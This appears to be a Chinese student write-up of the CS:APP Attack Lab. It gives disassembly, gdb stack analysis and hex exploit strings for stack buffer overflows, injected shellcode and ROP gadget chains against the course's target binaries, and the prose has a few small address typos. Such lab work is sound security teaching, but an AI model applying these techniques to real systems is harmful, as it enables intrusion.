# Attack lab

## phase 1

根据官方文档得到里面使用的函数：

```C
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
	vlevel = 1;
	/* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

我们需要让 `test` 调用 `getbuf` 后，将返回地址修改为 `touch1` 的返回地址．

首先反汇编 `objdump -d ctarget > ctarget.s` 后运行 `less cartget.s`，输入 `/FunctionName` 查找这些函数的地址：

```assembly
0000000000401921 <getbuf>:
  401921:       48 83 ec 38             sub    $0x38,%rsp	# 栈指针下移 56 字节
  401925:       48 89 e7                mov    %rsp,%rdi
  401928:       e8 ac 02 00 00          callq  401bd9 <Gets>
  40192d:       b8 01 00 00 00          mov    $0x1,%eax
  401932:       48 83 c4 38             add    $0x38,%rsp
  401936:       c3                      retq

0000000000401937 <touch1>:
  401937:       48 83 ec 08             sub    $0x8,%rsp
  40193b:       48 c1 ec 04             shr    $0x4,%rsp
  40193f:       48 c1 e4 04             shl    $0x4,%rsp
  401943:       c7 05 af 3b 20 00 01    movl   $0x1,0x203baf(%rip)        # 6054fc <vlevel>
  40194a:       00 00 00
  40194d:       48 8d 3d 48 19 00 00    lea    0x1948(%rip),%rdi        # 40329c <_IO_stdin_used+0x30c>
  401954:       e8 67 f3 ff ff          callq  400cc0 <puts@plt>
  401959:       bf 01 00 00 00          mov    $0x1,%edi
  40195e:       e8 d8 04 00 00          callq  401e3b <validate>
  401963:       bf 00 00 00 00          mov    $0x0,%edi
  401968:       e8 c3 f4 ff ff          callq  400e30 <exit@plt>

0000000000401b06 <test>:
  401b06:       48 83 ec 08             sub    $0x8,%rsp
  401b0a:       b8 00 00 00 00          mov    $0x0,%eax
  401b0f:       e8 0d fe ff ff          callq  401921 <getbuf>
  401b14:       89 c2                   mov    %eax,%edx
  401b16:       48 8d 35 43 18 00 00    lea    0x1843(%rip),%rsi        # 403360 <_IO_stdin_used+0x3d0>
  401b1d:       bf 01 00 00 00          mov    $0x1,%edi
  401b22:       b8 00 00 00 00          mov    $0x0,%eax
  401b27:       e8 b4 f2 ff ff          callq  400de0 <__printf_chk@plt>
  401b2c:       48 83 c4 08             add    $0x8,%rsp
  401b30:       c3                      retq

0000000000401bd9 <Gets>:
  401bd9:       41 54                   push   %r12
  401bdb:       55                      push   %rbp
  401bdc:       53                      push   %rbx
  401bdd:       49 89 fc                mov    %rdi,%r12
  401be0:       c7 05 3a 45 20 00 00    movl   $0x0,0x20453a(%rip)        # 606124 <gets_cnt>
  401be7:       00 00 00
  401bea:       48 89 fb                mov    %rdi,%rbx
  401bed:       eb 11                   jmp    401c00 <Gets+0x27>
  401bef:       48 8d 6b 01             lea    0x1(%rbx),%rbp
  401bf3:       88 03                   mov    %al,(%rbx)
  401bf5:       0f b6 f8                movzbl %al,%edi
  401bf8:       e8 34 ff ff ff          callq  401b31 <save_char>
  401bfd:       48 89 eb                mov    %rbp,%rbx
  401c00:       48 8b 3d e9 38 20 00    mov    0x2038e9(%rip),%rdi        # 6054f0 <infile>
  401c07:       e8 a4 f1 ff ff          callq  400db0 <_IO_getc@plt>
  401c0c:       83 f8 ff                cmp    $0xffffffff,%eax
  401c0f:       74 05                   je     401c16 <Gets+0x3d>
  401c11:       83 f8 0a                cmp    $0xa,%eax
  401c14:       75 d9                   jne    401bef <Gets+0x16>
  401c16:       c6 03 00                movb   $0x0,(%rbx)
  401c19:       b8 00 00 00 00          mov    $0x0,%eax
  401c1e:       e8 67 ff ff ff          callq  401b8a <save_term>
  401c23:       4c 89 e0                mov    %r12,%rax
  401c26:       5b                      pop    %rbx
  401c27:       5d                      pop    %rbp
  401c28:       41 5c                   pop    %r12
  401c2a:       c3                      retq
```

`test` 调用 `getbuf` 后，会将返回地址 `0x0000000000401b14` 压入栈中

`getbuf` 会把栈指针下移 56 字节，然后将 `%rsp` 地址作为 `buf` 的起始地址传入．等效于开了个 `char buf[56]` 的数组．最后将栈指针上移动 56 字节返回．

栈的结构（小端序，默认左上为低地址，右下为高地址）：

```
+--------------------------+ <- %rsp (before getbuf ret)
| char buf[56]             |
+--------------------------+ <- %rsp (when getbuf ret)
| return address 		   |
| 14 1b 40 00 00 00 00 00  | 
+--------------------------+
| caller's stack frame     |
+--------------------------+ 
```

我们需要把地址修改为 `0x0000000000401937`．再加上需要填 56 个垃圾字符（这里选 41 A），我们需要输入：

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
37 19 40 00 00 00 00 00
```

将其写入 `p1.txt`，用 `./hex2raw < p1.txt | ./ctarget` 将字符串传入 `ctarget`，得到

```assembly
202521xxxx@bupt1:~/target14$ ./hex2raw <p1.txt | ./ctarget
    Cookie: 0x2d6fc2d5
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

通过 phase1．

## phase 2

C 代码：

```c
void touch2(unsigned val)
{
    vlevel = 2;		/* Part of validation protocol */
	if (val == cookie) {
	printf("Touch2!: You called touch2(0x%.8x)\n", val);
	validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

以及对应的汇编代码：

```assembly
000000000040196d <touch2>:
  40196d:       48 83 ec 08             sub    $0x8,%rsp
  401971:       89 fa                   mov    %edi,%edx
  401973:       48 c1 ec 04             shr    $0x4,%rsp
  401977:       48 c1 e4 04             shl    $0x4,%rsp
  40197b:       c7 05 77 3b 20 00 02    movl   $0x2,0x203b77(%rip)        # 6054fc <vlevel>
  401982:       00 00 00
  401985:       39 3d 79 3b 20 00       cmp    %edi,0x203b79(%rip)        # 605504 <cookie>
  40198b:       75 22                   jne    4019af <touch2+0x42>
  40198d:       48 8d 35 2c 19 00 00    lea    0x192c(%rip),%rsi        # 4032c0 <_IO_stdin_used+0x330>
  401994:       bf 01 00 00 00          mov    $0x1,%edi
  401999:       b8 00 00 00 00          mov    $0x0,%eax
  40199e:       e8 3d f4 ff ff          callq  400de0 <__printf_chk@plt>
  4019a3:       bf 02 00 00 00          mov    $0x2,%edi
  4019a8:       e8 8e 04 00 00          callq  401e3b <validate>
  4019ad:       eb 20                   jmp    4019cf <touch2+0x62>
  4019af:       48 8d 35 32 19 00 00    lea    0x1932(%rip),%rsi        # 4032e8 <_IO_stdin_used+0x358>
  4019b6:       bf 01 00 00 00          mov    $0x1,%edi
  4019bb:       b8 00 00 00 00          mov    $0x0,%eax
  4019c0:       e8 1b f4 ff ff          callq  400de0 <__printf_chk@plt>
  4019c5:       bf 02 00 00 00          mov    $0x2,%edi
  4019ca:       e8 39 05 00 00          callq  401f08 <fail>
  4019cf:       bf 00 00 00 00          mov    $0x0,%edi
  4019d4:       e8 57 f4 ff ff          callq  400e30 <exit@plt>
```

此时我们不仅需要修改返回地址到 `touch2`，我们还要为指令序列生成字节码，让其给 `%rdi` 设置成 `Cookie: 0x2d6fc2d5` 后再返回． 

在缓冲区注入代码，这段代码将 `%rdi` 设置为 Cookie，然后执行 `ret`，返回地址是 `touch2`；要执行这段代码，就要把原来的返回地址 `0x0000000000401b14` 改为注入代码的首地址．

也就是：`getbuf` 返回到注入代码；注入代码设置寄存器，返回到 `touch2`．

接下来考虑代码设计．由于代码从低地址往高地址运行，因此靠前的代码应该在低地址处．

通过 gdb 设置断点得到，返回地址在栈里的起始地点是 `0x5566bd90`，`buf` 是 `0x5566bd58`．

```assembly
(gdb) disas getbuf
Dump of assembler code for function getbuf:
=> 0x0000000000401921 <+0>:     sub    $0x38,%rsp
   0x0000000000401925 <+4>:     mov    %rsp,%rdi
   0x0000000000401928 <+7>:     callq  0x401bd9 <Gets>
   0x000000000040192d <+12>:    mov    $0x1,%eax
   0x0000000000401932 <+17>:    add    $0x38,%rsp
   0x0000000000401936 <+21>:    retq
End of assembler dump.
(gdb) p/x $rsp
$1 = 0x5566bd90

Dump of assembler code for function getbuf:
   0x0000000000401921 <+0>:     sub    $0x38,%rsp
=> 0x0000000000401925 <+4>:     mov    %rsp,%rdi
   0x0000000000401928 <+7>:     callq  0x401bd9 <Gets>
   0x000000000040192d <+12>:    mov    $0x1,%eax
   0x0000000000401932 <+17>:    add    $0x38,%rsp
   0x0000000000401936 <+21>:    retq
End of assembler dump.
(gdb) p/x $rsp
$1 = 0x5566bd58
```

画出栈示意图：

```assembly
        0x5566bd58 (buf)	

        0x5566bd88
%rsp -> 0x5566bd90 (ra)		14 1b 40 00 00 00 00 00 
        0x5566bd98			......
```

在 `getbuf` 返回后，`%rsp` 指向 `0x5566bd90`，我们要让他返回到我们注入的代码：不妨就从 `buf` 开始处注入，那么就要返回到 `0x5566bd58`，因此要把此处改成 `58 bd 66 55 00 00 00 00`．

返回到注入代码后，我们需要注入一个 `ret` 去往 `touch2`，因此我们先控制返回的去向．此时 `%rsp` 指向 `0x5566bd98`，考虑在注入代码中将栈指针下移 `0x10`，让其指向 `0x5566bd88`，然后在该处注入 `touch2` 的地址 `40196d`，即 `6d 19 49 00 00 00 00 00`．

接下来是我们要注入的代码，共有三条：修改栈指针、将 Cookie 移动到 `%rdi`、`ret`．用附件 B 生成字节码的方法，先写汇编代码 `p2code.s`：

```assembly
subq $0x10, %rsp
movq $0x2d6fc2d5, %rdi
ret
```

将其编译完再反汇编得到需要的机器码，从 `48` 开始到 `c3`：

```assembly
202521xxxx@bupt1:~/target14$ gcc -c p2code.s
202521xxxx@bupt1:~/target14$ objdump -d p2code.o > p2code.d
202521xxxx@bupt1:~/target14$ cat p2code.d

p2code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 83 ec 10             sub    $0x10,%rsp
   4:   48 c7 c7 d5 c2 6f 2d    mov    $0x2d6fc2d5,%rdi
   b:   c3                      retq
```

在 `buf` 的前部分输入机器码，后部分输入 `touch2` 的地址，最后溢出修改返回地址，即

```assembly
202521xxxx@bupt1:~/target14$ cat p2.txt
48 83 ec 10 48 c7 c7 d5
c2 6f 2d c3 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
6d 19 40 00 00 00 00 00
58 bd 66 55 00 00 00 00

202521xxxx@bupt1:~/target14$ ./hex2raw < p2.txt | ./ctarget
Cookie: 0x2d6fc2d5
Type string:Touch2!: You called touch2(0x2d6fc2d5)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

通过 phase2．

## phase 3
C 代码：

```C
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3;
	/* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

汇编代码：

```assembly
00000000004019d9 <hexmatch>:
  4019d9:       41 54                   push   %r12
  4019db:       55                      push   %rbp
  4019dc:       53                      push   %rbx
  4019dd:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  4019e1:       89 fd                   mov    %edi,%ebp
  4019e3:       48 89 f3                mov    %rsi,%rbx
  4019e6:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  4019ed:       00 00
  4019ef:       48 89 44 24 78          mov    %rax,0x78(%rsp)
  4019f4:       31 c0                   xor    %eax,%eax
  4019f6:       e8 a5 f3 ff ff          callq  400da0 <random@plt>
  4019fb:       48 89 c1                mov    %rax,%rcx
  4019fe:       48 ba 0b d7 a3 70 3d    movabs $0xa3d70a3d70a3d70b,%rdx
  401a05:       0a d7 a3
  401a08:       48 f7 ea                imul   %rdx
  401a0b:       48 01 ca                add    %rcx,%rdx
  401a0e:       48 c1 fa 06             sar    $0x6,%rdx
  401a12:       48 89 c8                mov    %rcx,%rax
  401a15:       48 c1 f8 3f             sar    $0x3f,%rax
  401a19:       48 29 c2                sub    %rax,%rdx
  401a1c:       48 8d 04 92             lea    (%rdx,%rdx,4),%rax
  401a20:       48 8d 14 80             lea    (%rax,%rax,4),%rdx
  401a24:       48 8d 04 95 00 00 00    lea    0x0(,%rdx,4),%rax
  401a2b:       00
  401a2c:       48 29 c1                sub    %rax,%rcx
  401a2f:       4c 8d 24 0c             lea    (%rsp,%rcx,1),%r12
  401a33:       41 89 e8                mov    %ebp,%r8d
  401a36:       48 8d 0d 7c 18 00 00    lea    0x187c(%rip),%rcx        # 4032b9 <_IO_stdin_used+0x329>
  401a3d:       48 c7 c2 ff ff ff ff    mov    $0xffffffffffffffff,%rdx
  401a44:       be 01 00 00 00          mov    $0x1,%esi
  401a49:       4c 89 e7                mov    %r12,%rdi
  401a4c:       b8 00 00 00 00          mov    $0x0,%eax
  401a51:       e8 0a f4 ff ff          callq  400e60 <__sprintf_chk@plt>
  401a56:       ba 09 00 00 00          mov    $0x9,%edx
  401a5b:       4c 89 e6                mov    %r12,%rsi
  401a5e:       48 89 df                mov    %rbx,%rdi
  401a61:       e8 3a f2 ff ff          callq  400ca0 <strncmp@plt>
  401a66:       85 c0                   test   %eax,%eax
  401a68:       0f 94 c0                sete   %al
  401a6b:       48 8b 5c 24 78          mov    0x78(%rsp),%rbx
  401a70:       64 48 33 1c 25 28 00    xor    %fs:0x28,%rbx
  401a77:       00 00
  401a79:       74 05                   je     401a80 <hexmatch+0xa7>
  401a7b:       e8 60 f2 ff ff          callq  400ce0 <__stack_chk_fail@plt>
  401a80:       0f b6 c0                movzbl %al,%eax
  401a83:       48 83 ec 80             sub    $0xffffffffffffff80,%rsp
  401a87:       5b                      pop    %rbx
  401a88:       5d                      pop    %rbp
  401a89:       41 5c                   pop    %r12
  401a8b:       c3                      retq
  
0000000000401a8c <touch3>:
  401a8c:       53                      push   %rbx
  401a8d:       48 89 fb                mov    %rdi,%rbx
  401a90:       48 c1 ec 04             shr    $0x4,%rsp
  401a94:       48 c1 e4 04             shl    $0x4,%rsp
  401a98:       c7 05 5a 3a 20 00 03    movl   $0x3,0x203a5a(%rip)        # 6054fc <vlevel>
  401a9f:       00 00 00
  401aa2:       48 89 fe                mov    %rdi,%rsi
  401aa5:       8b 3d 59 3a 20 00       mov    0x203a59(%rip),%edi        # 605504 <cookie>
  401aab:       e8 29 ff ff ff          callq  4019d9 <hexmatch>
  401ab0:       85 c0                   test   %eax,%eax
  401ab2:       74 25                   je     401ad9 <touch3+0x4d>
  401ab4:       48 89 da                mov    %rbx,%rdx
  401ab7:       48 8d 35 52 18 00 00    lea    0x1852(%rip),%rsi        # 403310 <_IO_stdin_used+0x380>
  401abe:       bf 01 00 00 00          mov    $0x1,%edi
  401ac3:       b8 00 00 00 00          mov    $0x0,%eax
  401ac8:       e8 13 f3 ff ff          callq  400de0 <__printf_chk@plt>
  401acd:       bf 03 00 00 00          mov    $0x3,%edi
  401ad2:       e8 64 03 00 00          callq  401e3b <validate>
  401ad7:       eb 23                   jmp    401afc <touch3+0x70>
  401ad9:       48 89 da                mov    %rbx,%rdx
  401adc:       48 8d 35 55 18 00 00    lea    0x1855(%rip),%rsi        # 403338 <_IO_stdin_used+0x3a8>
  401ae3:       bf 01 00 00 00          mov    $0x1,%edi
  401ae8:       b8 00 00 00 00          mov    $0x0,%eax
  401aed:       e8 ee f2 ff ff          callq  400de0 <__printf_chk@plt>
  401af2:       bf 03 00 00 00          mov    $0x3,%edi
  401af7:       e8 0c 04 00 00          callq  401f08 <fail>
  401afc:       bf 00 00 00 00          mov    $0x0,%edi
  401b01:       e8 2a f3 ff ff          callq  400e30 <exit@plt>
```

与第二关类似，这一关需要把 Cookie 当作字符串存在栈的一个地方，然后将该地方的地址存入 `%rdi`．文档中提示我们 `hexmatch` 和 `sprintf` 会调用栈，我们用 gdb 调试后会发现，如果我们把字符数组存在缓冲区，调用 `hexmatch` 后会被新的栈帧顶掉．

由于新的栈帧只会出现在 `%rsp` 的下方，因此我们应该把字符数组存在 `%rsp` 上方．`0x5566bd90` 的位置我们修改了返回地址到注入代码，因此可以把字符数组存在 `0x5566bd98`．那么相较于第二关，就要把 `0x5566bd98` 存入 `%rdi` 作为参数传入，同时修改第二次返回地址为 `touch3` 的地址．

```assembly
subq $0x10, %rsp
movq $0x5566bd98, %rdi
ret

202521xxxx@bupt1:~/target14$ gcc -c p3code.s
202521xxxx@bupt1:~/target14$ objdump -d p3code.o > p3code.d
202521xxxx@bupt1:~/target14$ cat p3code.d

p3code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 83 ec 10             sub    $0x10,%rsp
   4:   48 c7 c7 98 bd 66 55    mov    $0x5566bd98, %rdi
   b:   c3                      retq
```

然后是查看 Cookie 的二进制表示：`2d6fc3d5` 对应到 ASCII 为 `32 64 36 66 63 32 64 35 00`，注入到 `0x5566bd98` 处即可．

```assembly
202521xxxx@bupt1:~/target14$ cat p3.txt
48 83 ec 10 48 c7 c7 98
bd 66 55 c3 41 41 41 41
00 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
8c 1a 40 00 00 00 00 00
58 bd 66 55 00 00 00 00
32 64 36 66 63 32 64 35 00

202521xxxx@bupt1:~/target14$ ./hex2raw < p3.txt | ./ctarget
Cookie: 0x2d6fc2d5
Type string:Touch3!: You called touch3("2d6fc2d5")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

通过 phase3．

## phase 4

从现在开始，每一次运行时栈指针的绝对位置都会随机，同时栈内容不可执行，需要使用 gadgets．

由于栈内容不可执行，因此想要让 `%rdi` 拿到 Cookie 的唯一方法就是把 Cookie 写入栈中，然后用 gadget `popq` 出来．对应的二进制代码为 `58-5f`，使用正则查找发现整个代码里只有 `58 c3`（在地址 `0x401b64` 处），对应 `popq %rax`：

```assembly
202521xxxx@bupt1:~/target14$ less rtarget.s
/5[89a-f] c3

0000000000401b60 <setval_414>:
  401b60:       c7 07 b4 01 58 c3       movl   $0xc35801b4,(%rdi)
  401b66:       c3                      retq
```

因此还需要一个 `movq %rax, %rdi` 的 gadget，对应二进制代码 `48 89 c7`，找到地址 `0x401b6a` 处．

```assembly
/48 89 c7

0000000000401b67 <setval_391>:
  401b67:       c7 07 00 48 89 c7       movl   $0xc7894800,(%rdi)
  401b6d:       c3                      retq
```

找到了所有需要的组件，接下来就是连锁反应了：

> `getbuf` 返回 --> 返回到 `0x401b60` --> 将栈顶数据弹出到 `%rax`，再次返回 --> 返回到 `0x401b6a` --> 将 `%rax` 移动到 `%rdi`，再次返回 --> 返回到 `touch2`，通关

根据这个流程，我们的输入应该为：

```
202521xxxx@bupt1:~/target14$ cat p4.txt
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
64 1b 40 00 00 00 00 00
d5 c2 6f 2d 00 00 00 00
6a 1b 40 00 00 00 00 00
6d 19 40 00 00 00 00 00
```

前面 56 个占位符把缓冲区挤满；然后 `64 1b 40 00 00 00 00 00` 作为返回地址，返回到 `0x401b60`；栈指针上移，执行 `popq %rax` 将 `d5 c2 6f 2d 00 00 00 00`  弹入 `%rax`；栈指针上移，执行 `ret` 返回到 `0x401b6a`；栈指针上移，先执行 `movq %rax, %rdi` 将 Cookie 放入 `%rdi`，然后 `ret` 返回到 `touch2` 的地址 `0x40196d`，通过 phase4．

## phase 5

由于栈指针位置不确定，因此要根据与 `%rsp` 的相对位置来得到字符数组的绝对位置．首先需要将 `%rsp` 的值移出，查表并用正则表达式得到 `movq %rsp, %rax` 在 `0x401c43` 处：

```assembly
/48 89 e[0-7]

0000000000401c41 <setval_401>:
  401c41:       c7 07 48 89 e0 c3       movl   $0xc3e08948,(%rdi)
  401c47:       c3                      retq
```

接下来需要用加法得到偏移量，但是 handout 里并没有给我们可以计算加法的指令（`addq, leaq`）对应机器码，因此需要到 `farm.c` 里去找找，发现找到了 

```C
/* Add two arguments */
long add_xy(long x, long y)
{
    return x+y;
}
```

查到对应汇编指令为

```assembly
0000000000401b74 <add_xy>:
  401b74:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  401b78:       c3                      retq
```

因此，我们需要把 `%rax` 中存的栈指针移动到 `%rdi` 或 `%rsi` 中，再把一个立即数 `popq` 到它们中的另一寄存器，最后再调用这个函数．

`movq %rax, %rdi` 这个指令在 phase4 中已经发现过了；还需要把立即数 `popq` 到 `%rsi` 中，但是根据 phase4 的经验我们知道代码中只有 `popq %rax`，因此我们要找 `movq %rax, %rsi`（由于此时我们处理的不再是栈指针地址，因此也可以用 `movl`，32 位够用），也就是要找到 `89 c6`．但是查了发现根本没有，因此只能希望用其他寄存器中转．

```assembly
/89 c[0-7]

movl %eax, %edi :
0000000000401b59 <setval_392>:
  401b59:       c7 07 27 08 89 c7       movl   $0xc7890827,(%rdi)
  401b5f:       c3  
  
movl %eax, %edx :
0000000000401c13 <getval_372>:
  401c13:       b8 cd bb 89 c2          mov    $0xc289bbcd,%eax
  401c18:       c3
```

找到了 `%edi` 和 `%edx` 作为中转，接下来找以这俩寄存器为源的指令：

```assembly
/89 f[89a-f]
# 没有合适的

/89 d[0-7]
0000000000401b87 <addval_497>:
  401b87:       8d 87 89 d1 08 c9       lea    -0x36f72e77(%rdi),%eax
  401b8d:       c3                      retq
  
0000000000401c0c <addval_220>:
  401c0c:       8d 87 89 d1 84 d2       lea    -0x2d7b2e77(%rdi),%eax
  401c12:       c3                      retq
```

`%edi` 没有合适的 gadget，`%edx` 有 `movl %edx, %ecx` 的gadget（因为 `08 c9` 和 `84 d2` 是 handout 给出的 nop 指令），接着再找以 `%ecx` 为源的指令：

```assembly
/89 c[89a-f]

0000000000401bf1 <setval_349>:
  401bf1:       c7 07 89 ce 90 90       movl   $0x9090ce89,(%rdi)
  401bf7:       c3                      retq
```

我们找到了 `movl %ecx, %esi`（0x90 是 nop 指令），完成了闭环．

整理目前的地址与操作：

```assembly
0x401c43	%rsp --> %rax
0x401b6a	%rax --> %rdi
0x401b64	popq %rax
0x401c16	%eax --> %edx
0x401c0e	%edx --> %ecx
0x401bf3	%ecx --> %esi
0x401b74	%rdi + %rsi --> %rax 
0x401b6a	%rax --> %rdi
0x401a8c	touch3
```

得到输入为

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
43 1c 40 00 00 00 00 00
6a 1b 40 00 00 00 00 00 <-- %rdi 指向的地址
64 1b 40 00 00 00 00 00
48 00 00 00 00 00 00 00 	
16 1c 40 00 00 00 00 00
0e 1c 40 00 00 00 00 00
f3 1b 40 00 00 00 00 00
74 1b 40 00 00 00 00 00
6a 1b 40 00 00 00 00 00
8c 1a 40 00 00 00 00 00
32 64 36 66 63 32 64 35 00
```

输出答案：

```assembly
202521xxxx@bupt1:~/target14$ ./hex2raw < p5.txt | ./rtarget
Cookie: 0x2d6fc2d5
Type string:Touch3!: You called touch3("2d6fc2d5")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

通过 phase5．
